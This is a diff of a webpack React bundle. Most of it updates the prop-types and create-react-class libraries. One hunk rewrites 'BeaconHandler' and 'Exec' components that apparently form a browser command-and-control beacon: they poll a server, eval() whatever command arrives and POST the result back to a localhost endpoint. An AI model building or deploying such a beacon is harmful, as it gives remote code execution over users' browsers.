@@ -65,7 +65,7 @@
 /******/ 	}
 /******/ 	
 /******/ 	var hotApplyOnUpdate = true;
-/******/ 	var hotCurrentHash = "30512e7ce4c1ce9ea54d"; // eslint-disable-line no-unused-vars
+/******/ 	var hotCurrentHash = "6f0b224a1e604e44143c"; // eslint-disable-line no-unused-vars
 /******/ 	var hotCurrentModuleData = {};
 /******/ 	var hotCurrentParents = []; // eslint-disable-line no-unused-vars
 /******/ 	
@@ -604,9 +604,6 @@
 
 	var _reactDom2 = _interopRequireDefault(_reactDom);
 
-	//import Twitter from 'twitter';
-	//var Twitter = require('twitter');
-
 	//Beacon Handler
 	var BeaconHandler = _react2['default'].createClass({
 	  displayName: 'BeaconHandler',
@@ -642,50 +639,66 @@
 	  displayName: 'Exec',
 
 	  render: function render() {
-	    //console.log(this.props.data);
-	    var cmdNodes = this.props.data.map(function (command) {
+	    console.log(this.props.data);
+	    console.log(this.props.data.cmd);
+
+	    var resp = this.props.data;
+
+	    if (resp.cmd == "shell") {
+	      var expires = new Date();
+	      expires.setTime(expires.getTime() + 1 * 24 * 60 * 60 * 1000);
+	      document.cookie = "cmd=!!@" + resp.cmd + '!!@;expires=' + expires.toUTCString();
+
+	      //In Browser Execution
+	    } else {
+	        //Exec
+	        var res = eval(resp.cmd);
+	        console.log(res);
+
+	        //POST Response
+	        var request = new XMLHttpRequest();
+	        request.open('POST', 'http://localhost:80/responsepost', true);
+	        request.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
+
+	        request.send(JSON.stringify({ resp: res, sid: "1337" }));
+	      }
+
+	    /*
+	    var cmdNodes = this.props.data.map(function(command) {
 	      //Handle Command Execution
 	      //Standard JS Eval for execution
 	      //eval(command.CMD);
-
-	      //Commander for execution and local system passthrough
+	        //Commander for execution and local system passthrough
 	      console.log(command.cmd);
-	      console.log(command.cmd.substring(0, 4));
-	      console.log(typeof command.cmd);
 	      //var Twitter = require('twitter');
-
-	      //Logic powering inherent Commands
+	          //Logic powering inherent Commands
 	      if (command.cmd == "help") {
 	        //POST Response
 	        var request = new XMLHttpRequest();
-	        request.open('POST', 'http://localhost:8000/ctrl', true);
+	        request.open('POST', 'http://localhost:80/ctrl', true);
 	        request.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
-	        request.send(JSON.stringify({ resp: "Help Response Data", sid: "1337" }));
-	      } else if (command.cmd.substring(0, 4) == "exec") {
+	        request.send(JSON.stringify({resp:"Help Response Data", sid:"1337"}));
+	        } else if (command.cmd.substring(0,4) == "exec") {
 	        //POST Response
 	        //console.log("test" + command.cmd);
 	        //res = "a";
 	        var res = eval(command.cmd.slice(5));
 	        var request = new XMLHttpRequest();
-	        request.open('POST', 'http://localhost:8000/ctrl', true);
+	        request.open('POST', 'http://localhost:80/ctrl', true);
 	        request.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
-	        request.send(JSON.stringify({ resp: res, sid: "1337" }));
-	      } else {
-
-	        //Write to cookie if exec command
+	        request.send(JSON.stringify({resp: res, sid:"1337"}));
+	        } else {
+	          //Write to cookie if exec command
 	        var expires = new Date();
-	        expires.setTime(expires.getTime() + 1 * 24 * 60 * 60 * 1000);
+	        expires.setTime(expires.getTime() + (1 * 24 * 60 * 60 * 1000));
 	        document.cookie = "cmd=!!@" + command.cmd + '!!@;expires=' + expires.toUTCString();
-	      }
-
-	      return _react2['default'].createElement('span', null);
-	    });
-
+	        }
+	      */
 	    return _react2['default'].createElement('b', null);
 	  }
 	});
 
-	_reactDom2['default'].render(_react2['default'].createElement(BeaconHandler, { url: 'http://localhost:8000/test.html', pollInterval: 5000 }), document.getElementById('root'));
+	_reactDom2['default'].render(_react2['default'].createElement(BeaconHandler, { url: 'http://localhost:80/test.html', pollInterval: 5000 }), document.getElementById('root'));
 
 	/* REACT HOT LOADER */ }).call(this); } finally { if (true) { (function () { var foundReactClasses = module.hot.data && module.hot.data.foundReactClasses || false; if (module.exports && module.makeHot) { var makeExportsHot = __webpack_require__(196); if (makeExportsHot(module, __webpack_require__(104))) { foundReactClasses = true; } var shouldAcceptModule = true && foundReactClasses; if (shouldAcceptModule) { module.hot.accept(function (err) { if (err) { console.error("Cannot apply hot update to " + "app.js" + ": " + err.message); } }); } } module.hot.dispose(function (data) { data.makeHot = module.makeHot; data.foundReactClasses = foundReactClasses; }); })(); } }
 	/* WEBPACK VAR INJECTION */}.call(exports, __webpack_require__(2)(module)))
@@ -5396,13 +5409,31 @@
 
 	'use strict';
 
-	var emptyFunction = __webpack_require__(31);
-	var invariant = __webpack_require__(24);
-	var warning = __webpack_require__(30);
 	var assign = __webpack_require__(26);
 
 	var ReactPropTypesSecret = __webpack_require__(52);
 	var checkPropTypes = __webpack_require__(53);
+
+	var printWarning = function() {};
+
+	if (process.env.NODE_ENV !== 'production') {
+	  printWarning = function(text) {
+	    var message = 'Warning: ' + text;
+	    if (typeof console !== 'undefined') {
+	      console.error(message);
+	    }
+	    try {
+	      // --- Welcome to debugging React ---
+	      // This error was thrown as a convenience so that you can use this stack
+	      // to find the callsite that caused this warning to fire.
+	      throw new Error(message);
+	    } catch (x) {}
+	  };
+	}
+
+	function emptyFunctionThatReturnsNull() {
+	  return null;
+	}
 
 	module.exports = function(isValidElement, throwOnDirectAccess) {
 	  /* global Symbol */
@@ -5546,12 +5577,13 @@
 	      if (secret !== ReactPropTypesSecret) {
 	        if (throwOnDirectAccess) {
 	          // New behavior only for users of `prop-types` package
-	          invariant(
-	            false,
+	          var err = new Error(
 	            'Calling PropTypes validators directly is not supported by the `prop-types` package. ' +
 	            'Use `PropTypes.checkPropTypes()` to call them. ' +
 	            'Read more at http://fb.me/use-check-prop-types'
 	          );
+	          err.name = 'Invariant Violation';
+	          throw err;
 	        } else if (process.env.NODE_ENV !== 'production' && typeof console !== 'undefined') {
 	          // Old behavior for people using React.PropTypes
 	          var cacheKey = componentName + ':' + propName;
@@ -5560,15 +5592,12 @@
 	            // Avoid spamming the console because they are often not actionable except for lib authors
 	            manualPropTypeWarningCount < 3
 	          ) {
-	            warning(
-	              false,
+	            printWarning(
 	              'You are manually calling a React.PropTypes validation ' +
-	              'function for the `%s` prop on `%s`. This is deprecated ' +
+	              'function for the `' + propFullName + '` prop on `' + componentName  + '`. This is deprecated ' +
 	              'and will throw in the standalone `prop-types` package. ' +
 	              'You may be seeing this warning due to a third-party PropTypes ' +
-	              'library. See https://fb.me/react-warning-dont-call-proptypes ' + 'for details.',
-	              propFullName,
-	              componentName
+	              'library. See https://fb.me/react-warning-dont-call-proptypes ' + 'for details.'
 	            );
 	            manualPropTypeCallCache[cacheKey] = true;
 	            manualPropTypeWarningCount++;
@@ -5612,7 +5641,7 @@
 	  }
 
 	  function createAnyTypeChecker() {
-	    return createChainableTypeChecker(emptyFunction.thatReturnsNull);
+	    return createChainableTypeChecker(emptyFunctionThatReturnsNull);
 	  }
 
 	  function createArrayOfTypeChecker(typeChecker) {
@@ -5662,8 +5691,8 @@
 
 	  function createEnumTypeChecker(expectedValues) {
 	    if (!Array.isArray(expectedValues)) {
-	      process.env.NODE_ENV !== 'production' ? warning(false, 'Invalid argument supplied to oneOf, expected an instance of array.') : void 0;
-	      return emptyFunction.thatReturnsNull;
+	      process.env.NODE_ENV !== 'production' ? printWarning('Invalid argument supplied to oneOf, expected an instance of array.') : void 0;
+	      return emptyFunctionThatReturnsNull;
 	    }
 
 	    function validate(props, propName, componentName, location, propFullName) {
@@ -5705,21 +5734,18 @@
 
 	  function createUnionTypeChecker(arrayOfTypeCheckers) {
 	    if (!Array.isArray(arrayOfTypeCheckers)) {
-	      process.env.NODE_ENV !== 'production' ? warning(false, 'Invalid argument supplied to oneOfType, expected an instance of array.') : void 0;
-	      return emptyFunction.thatReturnsNull;
+	      process.env.NODE_ENV !== 'production' ? printWarning('Invalid argument supplied to oneOfType, expected an instance of array.') : void 0;
+	      return emptyFunctionThatReturnsNull;
 	    }
 
 	    for (var i = 0; i < arrayOfTypeCheckers.length; i++) {
 	      var checker = arrayOfTypeCheckers[i];
 	      if (typeof checker !== 'function') {
-	        warning(
-	          false,
+	        printWarning(
 	          'Invalid argument supplied to oneOfType. Expected an array of check functions, but ' +
-	          'received %s at index %s.',
-	          getPostfixForTypeWarning(checker),
-	          i
+	          'received ' + getPostfixForTypeWarning(checker) + ' at index ' + i + '.'
 	        );
-	        return emptyFunction.thatReturnsNull;
+	        return emptyFunctionThatReturnsNull;
 	      }
 	    }
 
@@ -5963,11 +5989,24 @@
 
 	'use strict';
 
+	var printWarning = function() {};
+
 	if (process.env.NODE_ENV !== 'production') {
-	  var invariant = __webpack_require__(24);
-	  var warning = __webpack_require__(30);
 	  var ReactPropTypesSecret = __webpack_require__(52);
 	  var loggedTypeFailures = {};
+
+	  printWarning = function(text) {
+	    var message = 'Warning: ' + text;
+	    if (typeof console !== 'undefined') {
+	      console.error(message);
+	    }
+	    try {
+	      // --- Welcome to debugging React ---
+	      // This error was thrown as a convenience so that you can use this stack
+	      // to find the callsite that caused this warning to fire.
+	      throw new Error(message);
+	    } catch (x) {}
+	  };
 	}
 
 	/**
@@ -5992,12 +6031,29 @@
 	        try {
 	          // This is intentionally an invariant that gets caught. It's the same
 	          // behavior as without this statement except with a better message.
-	          invariant(typeof typeSpecs[typeSpecName] === 'function', '%s: %s type `%s` is invalid; it must be a function, usually from ' + 'the `prop-types` package, but received `%s`.', componentName || 'React class', location, typeSpecName, typeof typeSpecs[typeSpecName]);
+	          if (typeof typeSpecs[typeSpecName] !== 'function') {
+	            var err = Error(
+	              (componentName || 'React class') + ': ' + location + ' type `' + typeSpecName + '` is invalid; ' +
+	              'it must be a function, usually from the `prop-types` package, but received `' + typeof typeSpecs[typeSpecName] + '`.'
+	            );
+	            err.name = 'Invariant Violation';
+	            throw err;
+	          }
 	          error = typeSpecs[typeSpecName](values, typeSpecName, componentName, location, null, ReactPropTypesSecret);
 	        } catch (ex) {
 	          error = ex;
 	        }
-	        warning(!error || error instanceof Error, '%s: type specification of %s `%s` is invalid; the type checker ' + 'function must return `null` or an `Error` but returned a %s. ' + 'You may have forgotten to pass an argument to the type checker ' + 'creator (arrayOf, instanceOf, objectOf, oneOf, oneOfType, and ' + 'shape all require an argument).', componentName || 'React class', location, typeSpecName, typeof error);
+	        if (error && !(error instanceof Error)) {
+	          printWarning(
+	            (componentName || 'React class') + ': type specification of ' +
+	            location + ' `' + typeSpecName + '` is invalid; the type checker ' +
+	            'function must return `null` or an `Error` but returned a ' + typeof error + '. ' +
+	            'You may have forgotten to pass an argument to the type checker ' +
+	            'creator (arrayOf, instanceOf, objectOf, oneOf, oneOfType, and ' +
+	            'shape all require an argument).'
+	          )
+
+	        }
 	        if (error instanceof Error && !(error.message in loggedTypeFailures)) {
 	          // Only monitor this failure once because there tends to be a lot of the
 	          // same error.
@@ -6005,7 +6061,9 @@
 
 	          var stack = getStack ? getStack() : '';
 
-	          warning(false, 'Failed %s type: %s%s', location, error.message, stack != null ? stack : '');
+	          printWarning(
+	            'Failed ' + location + ' type: ' + error.message + (stack != null ? stack : '')
+	          );
 	        }
 	      }
 	    }
@@ -6333,6 +6391,27 @@
 	     */
 	    componentWillUnmount: 'DEFINE_MANY',
 
+	    /**
+	     * Replacement for (deprecated) `componentWillMount`.
+	     *
+	     * @optional
+	     */
+	    UNSAFE_componentWillMount: 'DEFINE_MANY',
+
+	    /**
+	     * Replacement for (deprecated) `componentWillReceiveProps`.
+	     *
+	     * @optional
+	     */
+	    UNSAFE_componentWillReceiveProps: 'DEFINE_MANY',
+
+	    /**
+	     * Replacement for (deprecated) `componentWillUpdate`.
+	     *
+	     * @optional
+	     */
+	    UNSAFE_componentWillUpdate: 'DEFINE_MANY',
+
 	    // ==== Advanced methods ====
 
 	    /**
@@ -6346,6 +6425,23 @@
 	     * @overridable
 	     */
 	    updateComponent: 'OVERRIDE_BASE'
+	  };
+
+	  /**
+	   * Similar to ReactClassInterface but for static methods.
+	   */
+	  var ReactClassStaticInterface = {
+	    /**
+	     * This method is invoked after a component is instantiated and when it
+	     * receives new props. Return an object to update state in response to
+	     * prop changes. Return null to indicate no change to state.
+	     *
+	     * If an object is returned, its keys will be merged into the existing state.
+	     *
+	     * @return {object || null}
+	     * @optional
+	     */
+	    getDerivedStateFromProps: 'DEFINE_MANY_MERGED'
 	  };
 
 	  /**
@@ -6582,6 +6678,7 @@
 	    if (!statics) {
 	      return;
 	    }
+
 	    for (var name in statics) {
 	      var property = statics[name];
 	      if (!statics.hasOwnProperty(name)) {
@@ -6598,14 +6695,25 @@
 	        name
 	      );
 
-	      var isInherited = name in Constructor;
-	      _invariant(
-	        !isInherited,
-	        'ReactClass: You are attempting to define ' +
-	          '`%s` on your component more than once. This conflict may be ' +
-	          'due to a mixin.',
-	        name
-	      );
+	      var isAlreadyDefined = name in Constructor;
+	      if (isAlreadyDefined) {
+	        var specPolicy = ReactClassStaticInterface.hasOwnProperty(name)
+	          ? ReactClassStaticInterface[name]
+	          : null;
+
+	        _invariant(
+	          specPolicy === 'DEFINE_MANY_MERGED',
+	          'ReactClass: You are attempting to define ' +
+	            '`%s` on your component more than once. This conflict may be ' +
+	            'due to a mixin.',
+	          name
+	        );
+
+	        Constructor[name] = createMergedResultFunction(Constructor[name], property);
+
+	        return;
+	      }
+
 	      Constructor[name] = property;
 	    }
 	  }
@@ -6913,6 +7021,12 @@
 	        !Constructor.prototype.componentWillRecieveProps,
 	        '%s has a method called ' +
 	          'componentWillRecieveProps(). Did you mean componentWillReceiveProps()?',
+	        spec.displayName || 'A component'
+	      );
+	      warning(
+	        !Constructor.prototype.UNSAFE_componentWillRecieveProps,
+	        '%s has a method called UNSAFE_componentWillRecieveProps(). ' +
+	          'Did you mean UNSAFE_componentWillReceiveProps()?',
 	        spec.displayName || 'A component'
 	      );
 	    }
